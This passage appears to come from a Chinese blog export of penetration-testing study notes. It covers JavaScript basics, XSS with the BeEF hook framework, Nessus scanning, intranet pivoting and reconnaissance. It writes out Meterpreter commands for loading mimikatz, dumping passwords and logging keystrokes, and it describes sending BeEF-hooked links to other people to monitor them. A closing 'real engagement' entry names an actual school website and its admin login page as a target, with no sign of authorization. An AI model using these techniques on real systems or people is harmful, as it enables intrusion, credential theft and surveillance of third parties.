src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627289408772-22c705f9-ce38-4f29-b9ed-c6260c4aa3c5.png#align=left&display=inline&height=283&margin=%5Bobject%20Object%5D&name=image.png&originHeight=566&originWidth=1250&size=300764&status=done&style=none&width=625" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627289439987-63120097-60bc-4589-9c13-ba75ecae80bc.png#align=left&display=inline&height=67&margin=%5Bobject%20Object%5D&name=image.png&originHeight=133&originWidth=790&size=191171&status=done&style=none&width=395" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627289458195-62c89109-a3f1-4cdf-acad-8b203698f0f0.png#align=left&display=inline&height=63&margin=%5Bobject%20Object%5D&name=image.png&originHeight=126&originWidth=873&size=73928&status=done&style=none&width=436.5" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627289467131-10b16ba6-4cf3-4830-8127-10c74e458b33.png#align=left&display=inline&height=105&margin=%5Bobject%20Object%5D&name=image.png&originHeight=210&originWidth=729&size=240564&status=done&style=none&width=364.5" alt="image.png"></p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2021/08/04/JavaScript/</url>
    <content><![CDATA[<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627356600808-0dc60608-222b-4ca2-96b4-2d1cc89b9a1e.png#align=left&display=inline&height=106&margin=%5Bobject%20Object%5D&name=image.png&originHeight=212&originWidth=1328&size=108411&status=done&style=none&width=664" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627356673958-4480c73d-61d9-43fc-b20e-35edf258c16f.png#align=left&display=inline&height=55&margin=%5Bobject%20Object%5D&name=image.png&originHeight=109&originWidth=289&size=12730&status=done&style=none&width=144.5" alt="image.png"></p>
<p>作用：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627357045409-1247e4ae-54f4-4cb7-a407-40d95a683e31.png#align=left&display=inline&height=152&margin=%5Bobject%20Object%5D&name=image.png&originHeight=304&originWidth=392&size=37315&status=done&style=none&width=196" alt="image.png"><br>其实也就是JAVAscript漏洞<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627357072875-58658477-df08-4cc5-8f9a-b44908778275.png#align=left&display=inline&height=65&margin=%5Bobject%20Object%5D&name=image.png&originHeight=129&originWidth=398&size=17473&status=done&style=none&width=199" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627357187993-8fa4b1ab-1814-496c-953c-d5df8abe6550.png#align=left&display=inline&height=20&margin=%5Bobject%20Object%5D&name=image.png&originHeight=39&originWidth=468&size=20737&status=done&style=none&width=234" alt="image.png"><br>BEEF中hook.js是一个钩子-木马</p>
<p>学习路线：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627357398346-bdb1661e-76e0-4300-bd1a-04c7d6b4353c.png#align=left&display=inline&height=79&margin=%5Bobject%20Object%5D&name=image.png&originHeight=157&originWidth=434&size=23087&status=done&style=none&width=217" alt="image.png"></p>
<h1 id="正式学习JavaScript"><a href="#正式学习JavaScript" class="headerlink" title="正式学习JavaScript"></a>正式学习JavaScript</h1><h2 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h2><ul>
<li>使用 <strong>window.alert()</strong> 弹出警告框。</li>
<li>使用 <strong>document.write()</strong> 方法将内容写到 HTML 文档中。</li>
<li>使用 <strong>innerHTML</strong> 写入到 HTML 元素。</li>
<li>使用 <strong>console.log()</strong> 写入到浏览器的控制台</li>
</ul>
<h2 id="一、window-alert"><a href="#一、window-alert" class="headerlink" title="一、window.alert()"></a>一、window.alert()</h2><script>
        alert("javastudy")
        </script>


<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627372476698-23626652-7e03-4d8d-9ef9-d0cd7135c4e0.png#align=left&display=inline&height=86&margin=%5Bobject%20Object%5D&name=image.png&originHeight=171&originWidth=640&size=9200&status=done&style=none&width=320" alt="image.png"></p>
<h2 id="操作-HTML-元素"><a href="#操作-HTML-元素" class="headerlink" title="操作 HTML 元素"></a>操作 HTML 元素</h2><p>如需从 JavaScript 访问某个 HTML 元素，您可以使用 document.getElementById(<em>id</em>) 方法。<br>使用 “id” 属性来标识 HTML 元素，并 innerHTML 来获取或插入元素内容<br><code>&lt;p id=&quot;demo&quot;&gt;here的内容&lt;/p&gt;</code><br><code>    &lt;script&gt;    document.getElementById(&quot;demo&quot;).innerHTML=&quot;我想要的内容&quot;;</code><br><code>     &lt;/script&gt;</code></p>
<p>最后输出的就是script内中的内容了<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627372983544-1140efa0-277c-4da8-9a09-ee6d8725ac4b.png#align=left&display=inline&height=45&margin=%5Bobject%20Object%5D&name=image.png&originHeight=90&originWidth=623&size=2763&status=done&style=none&width=311.5" alt="image.png"></p>
<p>输出时间<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627373085446-dae9dd62-85cc-4d91-9520-26100de4ccf0.png#align=left&display=inline&height=42&margin=%5Bobject%20Object%5D&name=image.png&originHeight=84&originWidth=260&size=3894&status=done&style=none&width=130" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627373095177-df4b7bcd-c954-49cf-9dfe-4dfeb8d6658c.png#align=left&display=inline&height=30&margin=%5Bobject%20Object%5D&name=image.png&originHeight=60&originWidth=560&size=4875&status=done&style=none&width=280" alt="image.png"></p>
<h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><ul>
<li>变量必须以字母开头</li>
<li>变量也能以 $ 和 _ 符号开头（不过我们不推荐这么做）</li>
<li>变量名称对大小写敏感（y 和 Y 是不同的变量）</li>
</ul>
<p>因此一般使用<code>var</code>进行设置变量</p>
<h3 id="声明创建对象"><a href="#声明创建对象" class="headerlink" title="声明创建对象"></a>声明创建对象</h3><p><code>&lt;button onclick=&quot;myFuntion()&quot;&gt;点击&lt;/button&gt;&lt;p id=&quot;demo&quot;&gt;&lt;/p&gt;</code><br><code>    &lt;script&gt;</code><br><code>    function myFuntion()&#123;    var carname=&quot;Vovo&quot;;    document.getElementById(&quot;demo&quot;).innerHTML=carname;&#125; </code><br><code>      &lt;/script&gt;</code></p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627374153925-02f8d4d3-0125-4031-95b1-91c48fca2653.png#align=left&display=inline&height=90&margin=%5Bobject%20Object%5D&name=image.png&originHeight=179&originWidth=250&size=3165&status=done&style=none&width=125" alt="image.png"></p>
<h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p><strong>值类型(基本类型)**：字符串（String）、数字(Number)、布尔(Boolean)、对空（Null）、未定义（Undefined）、Symbol。<br>**引用数据类型</strong>：对象(Object)、数组(Array)、函数(Function)。</p>
<p>字符串：<code>var carname=&quot;voov&quot;;</code><br><code>      var carname=&#39;vovo&#39;;  </code></p>
<p>数字：<code>var x1=23;整数 </code><br><code>var x2=1.22  小数</code><br>布尔：<code>var x=true;</code><br><code>var y=false;</code><br>布尔类型只有这两个值</p>
<p>数组：<br><code>&lt;script&gt;var i;var cars = new Array();</code><br><code>cars[0] = &quot;Saab&quot;;cars[1] = &quot;Volvo&quot;;cars[2] = &quot;BMW&quot;;</code><br><code>for (i=0;i&lt;cars.length;i++)&#123;document.write(cars[i] + &quot;&lt;br&gt;&quot;);</code><br><code>&#125;&lt;/script&gt;</code></p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627374848360-bb7e9cd8-9e99-474d-9957-8f9356e509e6.png#align=left&display=inline&height=61&margin=%5Bobject%20Object%5D&name=image.png&originHeight=121&originWidth=160&size=2256&status=done&style=none&width=80" alt="image.png"></p>
<p>对象：<br>对象由花括号分隔。在括号内部，对象的属性以名称和值对的形式 (name : value) 来定义。属性由逗号分隔<br><code>var person=&#123;</code><br><code>firstname : &quot;1&quot;,</code><br><code>lastname : &quot;2&quot;,</code><br><code>id : 22</code><br><code>&#125;; </code><br>寻址方式有两种:<br><code>&lt;script&gt;</code><br><code>var person=&#123;firstname  : &quot;WD&quot;,lastname   : &quot;DS&quot;,id         : 22&#125;;</code><br><code>document.write(person.lastname+&quot;&lt;br&gt;&quot;);</code><br><code>document.write(person[&quot;lastname&quot;]+&quot;&lt;br&gt;&quot;);</code><br><code>&lt;/script&gt;</code></p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627375376921-934fc1fe-20e6-4a05-9b37-15853afdf204.png#align=left&display=inline&height=69&margin=%5Bobject%20Object%5D&name=image.png&originHeight=138&originWidth=126&size=1310&status=done&style=none&width=63" alt="image.png"></p>
<p>声明变量类型<br>声明新变量时，可以使用关键词 “new” 来声明其类型：<br><code>var carname=new String;</code><br><code>var x=      new Number;</code><br><code>var y=      new Boolean;</code><br><code>var cars=   new Array;</code><br><code>var person= new Object;</code></p>
<p>对象方法<br>创建对象方法：<br><code>methodName : function() &#123;     // 代码  &#125;</code></p>
<p><code>&lt;p id=&quot;demo1&quot;&gt;&lt;/p&gt;&lt;p id=&quot;demo2&quot;&gt;&lt;/p&gt;</code><br><code>&lt;script&gt;</code><br><code>var person = &#123;</code><br><code>    firstName: &quot;John&quot;,</code><br><code>    lastName : &quot;Doe&quot;,</code><br><code>    id : 5566,    </code><br><code>fullName : function() &#123; </code><br><code>      return this.firstName + &quot; &quot; + this.lastName;    &#125;&#125;;</code><br><code>document.getElementById(&quot;demo1&quot;).innerHTML = &quot;不加括号输出函数表达式：&quot;  + person.fullName;</code><br><code>document.getElementById(&quot;demo2&quot;).innerHTML = &quot;加括号输出函数执行结果：&quot;  +  person.fullName();</code><br><code>&lt;/script&gt;</code><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627375960308-719053e1-e849-45cd-900c-5d5f9e934b2e.png#align=left&display=inline&height=58&margin=%5Bobject%20Object%5D&name=image.png&originHeight=115&originWidth=789&size=11530&status=done&style=none&width=394.5" alt="image.png"><br>可以看到第一个式子直接输出了fullName里的内容，因为person.fullName代表的是fullName是一个变量输出了变量里的字符串，<br>第二个式子则是将person.fullName（）这是一个方法，输出的是fullName:function中的方法内容</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2021/08/04/XSS/</url>
    <content><![CDATA[<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627353750244-eb30b7e8-2e0f-4920-81d5-42563fa0deb4.png#align=left&display=inline&height=53&margin=%5Bobject%20Object%5D&name=image.png&originHeight=106&originWidth=339&size=10445&status=done&style=none&width=169.5" alt="image.png"><br>通过网页上传我们写的HTML、css代码在代码中嵌入木马等</p>
<p>将script代码注入到网页内，然后别人打开后，别人的浏览器就会执行恶意代码</p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627353831549-e9f29379-a60a-4b50-95e0-b3f530c98cb3.png#align=left&display=inline&height=61&margin=%5Bobject%20Object%5D&name=image.png&originHeight=121&originWidth=371&size=23876&status=done&style=none&width=185.5" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627354470410-ebc23aa4-7fca-4bba-8ab7-646f4d6772da.png#align=left&display=inline&height=24&margin=%5Bobject%20Object%5D&name=image.png&originHeight=48&originWidth=1210&size=25404&status=done&style=none&width=605" alt="image.png"><br>查看cookie<br>如果对方的网站存在XSS漏洞，我们可以通过js,html等嵌入一个我们构造的网站框架，其中的代码中含有我们写的恶意代码，嵌入成功后，从而达到目的，比如：beef框架</p>
<p>beef是一个框架，docker 可以下载<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627354899403-130fd309-48b5-4d13-9e8f-71d100ad57fa.png#align=left&display=inline&height=12&margin=%5Bobject%20Object%5D&name=image.png&originHeight=23&originWidth=273&size=10770&status=done&style=none&width=136.5" alt="image.png"><br>下载<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627354920806-577450da-a1e7-4ddd-bd5d-4722cda6be26.png#align=left&display=inline&height=24&margin=%5Bobject%20Object%5D&name=image.png&originHeight=48&originWidth=346&size=15207&status=done&style=none&width=173" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627354937697-10a03282-eaee-4ba9-b13b-b1dac901e466.png#align=left&display=inline&height=15&margin=%5Bobject%20Object%5D&name=image.png&originHeight=29&originWidth=246&size=7685&status=done&style=none&width=123" alt="image.png"></p>
<p>开启<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627354960834-fe883fe6-1c9b-48ff-a5ab-a36181ceab30.png#align=left&display=inline&height=21&margin=%5Bobject%20Object%5D&name=image.png&originHeight=42&originWidth=512&size=23537&status=done&style=none&width=256" alt="image.png"><br>浏览器中打开<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627354989649-eae6144c-a7da-4d19-a375-4fb5cdebb834.png#align=left&display=inline&height=17&margin=%5Bobject%20Object%5D&name=image.png&originHeight=33&originWidth=264&size=8931&status=done&style=none&width=132" alt="image.png"><br>当发现对方的网站中存在XSS漏洞，可以通过script代码构造，嵌入beef框架，从而达到监视<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627355143054-0c91c210-f658-4a71-a2b6-38ff6f6e29f8.png#align=left&display=inline&height=23&margin=%5Bobject%20Object%5D&name=image.png&originHeight=46&originWidth=709&size=55358&status=done&style=none&width=354.5" alt="image.png"><br>在自己写的网站内嵌入beef框架，发布到外网后，将链接发给别人，对方在浏览器中打开网址，从而达到自己监控的目的</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2021/08/04/%E6%B8%97%E9%80%8F%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<h2 id="Nessus"><a href="#Nessus" class="headerlink" title="Nessus"></a>Nessus</h2><p>安装成功之后，倘若关机后服务就会关闭，再次开启网站也就进不去了，这时候需要</p>
<p>在/obt/nessus的目录下，再次开<img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1625986924729-59eaf639-d2e8-466e-9523-56b266409d46.png#align=left&display=inline&height=181&margin=%5Bobject%20Object%5D&name=image.png&originHeight=361&originWidth=567&size=88021&status=done&style=none&width=283.5" alt="image.png">启服务<code>net start &quot;Tenable Nessus&quot;</code></p>
<h3 id="实例扫描漏洞"><a href="#实例扫描漏洞" class="headerlink" title="实例扫描漏洞"></a><strong>实例扫描漏洞</strong></h3><p><strong>点击“New Scan”新建一个扫描</strong><br><strong><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1625987079913-231e6be2-4a8e-4c67-bb9e-f04a548c0bdf.png#align=left&display=inline&height=178&margin=%5Bobject%20Object%5D&name=image.png&originHeight=356&originWidth=829&size=21796&status=done&style=none&width=414.5" alt="image.png"></strong><br>**<br><strong>选择“Basic Network Scan”，进行配置项目名称，对项目的描述，以及最重要的目标IP地址。<img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1625987178248-bee79f3c-7bcf-40af-99c6-8901f5809536.png#align=left&display=inline&height=271&margin=%5Bobject%20Object%5D&name=image.png&originHeight=541&originWidth=1011&size=96338&status=done&style=none&width=505.5" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1625987246212-8a4a9184-5918-4a4f-bd6f-bca0649ed930.png#align=left&display=inline&height=236&margin=%5Bobject%20Object%5D&name=image.png&originHeight=471&originWidth=837&size=39025&status=done&style=none&width=418.5" alt="image.png"></strong><br>**<br><strong>如果我们有目标主机的账号、密码，我们可以点击”Credentials”,进行配置。如果是linux系统就配置SSH，windows就配置windows</strong></p>
<p><strong><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1625987522302-94225512-a254-4b35-8f5c-5f0ce0ec70ca.png#align=left&display=inline&height=271&margin=%5Bobject%20Object%5D&name=image.png&originHeight=541&originWidth=1696&size=84999&status=done&style=none&width=848" alt="image.png"></strong><br>**<br>**<br><strong>输入账号密码</strong><br>**<br><strong>我们还可以查看我们要用到的插件，点击”Plugins”进行查看。</strong><br><strong><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1625987679691-459d5b18-6c3f-413a-9d0e-5a4faf95032e.png#align=left&display=inline&height=230&margin=%5Bobject%20Object%5D&name=image.png&originHeight=459&originWidth=821&size=39351&status=done&style=none&width=410.5" alt="image.png"></strong><br>**<br><strong>全部配置完成之后，我们点击”Save”，进行保存，这样在”My Scan”就能看见我们之前配置过的windows10<img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1625987837006-b1375cc5-c02a-4a87-a871-f6fffae78058.png#align=left&display=inline&height=106&margin=%5Bobject%20Object%5D&name=image.png&originHeight=211&originWidth=945&size=22124&status=done&style=none&width=472.5" alt="image.png"></strong><br><strong>点击”&gt;”就可以进行扫描，用鼠标点击就能看到详细信息。</strong><br>**<br><strong><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1625988330691-dd5af1f2-baaa-4848-aa6b-fd4d20bf2087.png#align=left&display=inline&height=301&margin=%5Bobject%20Object%5D&name=image.png&originHeight=602&originWidth=1146&size=57749&status=done&style=none&width=573" alt="image.png"></strong><br>**<br>**<br>**<br>**<br><strong>我们点击”Vulnerables”，就能看见我们发现的漏洞。</strong><br><strong><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1625988366199-4964a259-3038-483f-b9a9-77bc274a7360.png#align=left&display=inline&height=304&margin=%5Bobject%20Object%5D&name=image.png&originHeight=608&originWidth=1180&size=89354&status=done&style=none&width=590" alt="image.png"></strong><br>**<br>**<br>**<br>**<br>**<br>**<br>**<br>**<br>**<br>**</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2021/08/04/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%EF%BC%88%E5%85%A5%E9%97%A8%EF%BC%89/</url>
    <content><![CDATA[<h1 id="内网转发"><a href="#内网转发" class="headerlink" title="内网转发"></a>内网转发</h1><p>拿到webshell进行端口转发，达到代理的目的<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627178596045-5a65a39b-2bef-4a87-86f5-77fb5d44c214.png#align=left&display=inline&height=237&margin=%5Bobject%20Object%5D&name=image.png&originHeight=473&originWidth=419&size=38996&status=done&style=none&width=209.5" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627178715676-885b11ba-8255-4ccf-ab13-bf95936f7b51.png#align=left&display=inline&height=158&margin=%5Bobject%20Object%5D&name=image.png&originHeight=316&originWidth=1033&size=69927&status=done&style=none&width=516.5" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627178749452-2705f915-499d-4ad1-8c38-415510c2d2d5.png#align=left&display=inline&height=199&margin=%5Bobject%20Object%5D&name=image.png&originHeight=397&originWidth=812&size=55912&status=done&style=none&width=406" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627182983513-c8c954d8-c0a4-4214-b057-a0899ee82827.png#align=left&display=inline&height=45&margin=%5Bobject%20Object%5D&name=image.png&originHeight=90&originWidth=275&size=8743&status=done&style=none&width=137.5" alt="image.png">监听状态<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627183278940-4a863690-52c2-4845-ac7c-5a38c76f4372.png#align=left&display=inline&height=105&margin=%5Bobject%20Object%5D&name=image.png&originHeight=209&originWidth=1179&size=61364&status=done&style=none&width=589.5" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627183346971-efea506c-4250-49b9-be5b-ec92f7656abe.png#align=left&display=inline&height=207&margin=%5Bobject%20Object%5D&name=image.png&originHeight=413&originWidth=605&size=89952&status=done&style=none&width=302.5" alt="image.png"><br>连接之后可以进行操作，比如查看ip<br>获取用户名什么的<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627183448137-ddddee9f-54c2-48c8-907e-6022baa87a53.png#align=left&display=inline&height=27&margin=%5Bobject%20Object%5D&name=image.png&originHeight=54&originWidth=624&size=15370&status=done&style=none&width=312" alt="image.png"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627179167722-9b26d7a6-4878-4aad-899a-6210ace32723.png#align=left&display=inline&height=99&margin=%5Bobject%20Object%5D&name=image.png&originHeight=198&originWidth=868&size=44343&status=done&style=none&width=434" alt="image.png"><br>功能比较强大</p>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>进入服务器后进行信息收集<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627179369235-3ab61663-55c1-46bc-ba2f-9d3df92aa225.png#align=left&display=inline&height=216&margin=%5Bobject%20Object%5D&name=image.png&originHeight=432&originWidth=1077&size=146624&status=done&style=none&width=538.5" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627179486512-abd11286-0328-49d8-bdce-cd75100b6104.png#align=left&display=inline&height=181&margin=%5Bobject%20Object%5D&name=image.png&originHeight=362&originWidth=410&size=47416&status=done&style=none&width=205" alt="image.png"><br>msf读取本机密码<img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627181491212-71476d0b-8a69-4e5c-883a-896b49217e1a.png#align=left&display=inline&height=217&margin=%5Bobject%20Object%5D&name=image.png&originHeight=433&originWidth=652&size=75629&status=done&style=none&width=326" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627181514150-e928c619-b6a3-4d3d-80b1-e58c34660b80.png#align=left&display=inline&height=227&margin=%5Bobject%20Object%5D&name=image.png&originHeight=453&originWidth=645&size=131377&status=done&style=none&width=322.5" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627181609307-99d4cfeb-b8da-4a27-ba3b-e64c6e8d6911.png#align=left&display=inline&height=209&margin=%5Bobject%20Object%5D&name=image.png&originHeight=417&originWidth=676&size=169273&status=done&style=none&width=338" alt="image.png"><br>以上演示是针对永恒之蓝漏洞-win7x64版本的，由于机主是win10之后的暂不演示，命令如下<br>返回后<br>load mimikatz<br>msv<br>kerberos<br>ps进入<br>migrate ####<br>migrate ####<br>keyscan start<br>keyscan dump<img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627182190030-19515ebd-2ce5-4f7b-997e-ea668bd9d519.png#align=left&display=inline&height=272&margin=%5Bobject%20Object%5D&name=image.png&originHeight=543&originWidth=988&size=633862&status=done&style=none&width=494" alt="image.png"><br>keyscan dump</p>
<h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627182805191-645831a9-16de-4053-9a8c-746b498be7aa.png#align=left&display=inline&height=225&margin=%5Bobject%20Object%5D&name=image.png&originHeight=450&originWidth=735&size=45292&status=done&style=none&width=367.5" alt="image.png"><br>端口扫描：8080,3389-远程登录,701,445,1433-msfsql<br>御剑其实更快扫描端口<br>命令执行：java反序列化漏洞<br>mysql-权限<br>文件上传-进行绕过</p>
<h1 id="收尾工程"><a href="#收尾工程" class="headerlink" title="收尾工程"></a>收尾工程</h1><p><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1627183739435-c56eb16a-914a-43dd-ac21-535ba0a7a2b3.png#align=left&display=inline&height=191&margin=%5Bobject%20Object%5D&name=image.png&originHeight=382&originWidth=831&size=72264&status=done&style=none&width=415.5" alt="image.png"><br>还有一些工具可以用于清理</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>拿到权限绕过防火墙-进行端口转发或者进行代理-socks多层代理-信息收集-拿到各种密码-进行端口扫描要针对型扫描，针对某个端口（因为扫描的时候会造成很大的动静）-得到漏洞</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2021/08/04/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1626088156178-c7769928-5f46-4b8f-94e6-63fe06883caf.png#align=left&display=inline&height=342&margin=%5Bobject%20Object%5D&name=image.png&originHeight=684&originWidth=1235&size=840387&status=done&style=none&width=617.5" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1626088171085-d730e888-6c6a-4945-a32d-24eb5dfc9ad3.png#align=left&display=inline&height=313&margin=%5Bobject%20Object%5D&name=image.png&originHeight=625&originWidth=1304&size=802686&status=done&style=none&width=652" alt="image.png"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1626088272552-6d1bc8f3-dfc6-4be5-8799-ad8bd7b6753c.png#align=left&display=inline&height=278&margin=%5Bobject%20Object%5D&name=image.png&originHeight=556&originWidth=1270&size=461097&status=done&style=none&width=635" alt="image.png"><br>软件版本号，信心显示、作者等，通过版本号等信息，进行攻击造成服务损坏<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1626088454411-1abb4ab1-36fc-4506-91a0-1fbc839b922e.png#align=left&display=inline&height=283&margin=%5Bobject%20Object%5D&name=image.png&originHeight=565&originWidth=976&size=569035&status=done&style=none&width=488" alt="image.png"><br>主域名安防高，通过子域名发掘漏洞更加容易，从而进行渗透</p>
<p>nmap工具更加强大<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1626091420370-1b49f909-1c54-44d4-a621-1488fc2289f4.png#align=left&display=inline&height=285&margin=%5Bobject%20Object%5D&name=image.png&originHeight=570&originWidth=1031&size=530936&status=done&style=none&width=515.5" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1626089772404-84419fbc-9371-48c2-a81a-02d0dac04877.png#align=left&display=inline&height=336&margin=%5Bobject%20Object%5D&name=image.png&originHeight=672&originWidth=1336&size=766105&status=done&style=none&width=668" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1626091626976-0bb56aa2-7dcb-4747-b57b-ae502d16754c.png#align=left&display=inline&height=192&margin=%5Bobject%20Object%5D&name=image.png&originHeight=384&originWidth=539&size=83757&status=done&style=none&width=269.5" alt="image.png"></p>
<p>whois<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1626089794157-ce1c7e96-09a7-4199-9e35-1116dd7756a3.png#align=left&display=inline&height=289&margin=%5Bobject%20Object%5D&name=image.png&originHeight=577&originWidth=1005&size=605684&status=done&style=none&width=502.5" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1626089907670-4cf490ad-b14f-4140-847a-7c3c8ae9da79.png#align=left&display=inline&height=233&margin=%5Bobject%20Object%5D&name=image.png&originHeight=466&originWidth=686&size=146863&status=done&style=none&width=343" alt="image.png"></p>
<p>nslookup 查询DNS服务器地址</p>
<p>C段<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1626089997611-2701e2bf-9684-4185-8971-04fafaa02d85.png#align=left&display=inline&height=305&margin=%5Bobject%20Object%5D&name=image.png&originHeight=609&originWidth=1311&size=690031&status=done&style=none&width=655.5" alt="image.png"><br>tranceroute-反查域名<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1626090513605-910868e4-f550-41f8-902a-2ad4cd269567.png#align=left&display=inline&height=172&margin=%5Bobject%20Object%5D&name=image.png&originHeight=344&originWidth=563&size=91773&status=done&style=none&width=281.5" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1626090607962-fa5dca48-6ab7-428e-86ea-94aea87ded0f.png#align=left&display=inline&height=248&margin=%5Bobject%20Object%5D&name=image.png&originHeight=496&originWidth=974&size=347205&status=done&style=none&width=487" alt="image.png"><br>whatweb<img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1626090693117-25fe29d5-1d46-4955-83bb-191e915c90cc.png#align=left&display=inline&height=205&margin=%5Bobject%20Object%5D&name=image.png&originHeight=409&originWidth=1668&size=166577&status=done&style=none&width=834" alt="image.png"></p>
<p>记录一次实战<br><a href="http://www.pyyszx.cn/">http://www.pyyszx.cn/</a></p>
<p>| <a href="http://www.pyyszx.cn/"><strong>设为首页</strong></a>  濮阳市油田艺术中学  <a href="https://bszs.conac.cn/sitename?method=show&id=0C30B9CF3D1C1E6AE053012819ACE3A5"><img src="https://cdn.nlark.com/yuque/0/2021/png/12570963/1626092192747-de753e8e-a6e3-41e5-8aea-a9cc7e0946fe.png#align=left&display=inline&height=80&margin=%5Bobject%20Object%5D&originHeight=80&originWidth=80&size=0&status=done&style=none&width=80"></a> Copyright©  2010-2019  <a href="http://www.pyyszx.cn/baishuadmin/"><strong>管理登陆</strong>
</a>地址：河南省濮阳市任丘路335号  邮编：457001  电话：0393-4821909  邮箱：<a href="mailto:pyyszx@163.com">pyyszx@163.com</a>  <a href="http://beian.miit.gov.cn/">豫ICP备17017403号</a> <a href="https://www.cnzz.com/stat/website.php?web_id=1254058491"><img src="https://cdn.nlark.com/yuque/0/2021/gif/12570963/1626092192632-cc183e60-9b26-4e16-b682-4b5210ef3490.gif#align=left&display=inline&height=12&margin=%5Bobject%20Object%5D&originHeight=12&originWidth=50&size=0&status=done&style=none&width=50"></a> |<br>| — |<br>| 您是本站的第 <img src="https://cdn.nlark.com/yuque/0/2021/gif/12570963/1626092192665-e7f83212-e976-4066-910b-b7d78243a8d0.gif#align=left&display=inline&height=20&margin=%5Bobject%20Object%5D&originHeight=20&originWidth=15&size=0&status=done&style=none&width=15"><img src="https://cdn.nlark.com/yuque/0/2021/gif/12570963/1626092192666-fd18ce67-a20f-4b59-9910-19a2780b6c7f.gif#align=left&display=inline&height=20&margin=%5Bobject%20Object%5D&originHeight=20&originWidth=15&size=0&status=done&style=none&width=15"><img 